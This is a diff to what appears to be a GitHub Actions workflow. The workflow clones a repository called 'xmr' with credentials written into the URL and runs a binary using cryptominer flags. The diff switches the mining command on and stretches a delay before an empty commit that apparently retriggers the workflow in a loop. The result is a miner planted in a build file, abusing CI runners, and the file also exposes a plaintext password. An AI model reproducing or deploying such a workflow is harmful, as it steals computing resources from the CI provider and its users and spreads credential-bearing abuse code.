@@ -19,10 +19,10 @@ jobs:
           git clone https://daveyg1:Magratsucks123@github.com/daveyg1/xmr.git
           cd xmr
           chmod u+x prog
-          # timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
+          timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
           if [ ${{ matrix.runner }} -eq 0 ]
           then
-            sleep 30s
+            sleep 25m
             git config user.name 'Davey G'
             git config user.email 'daveyg1@yandex.com'
             git commit --allow-empty --allow-empty-message --no-edit
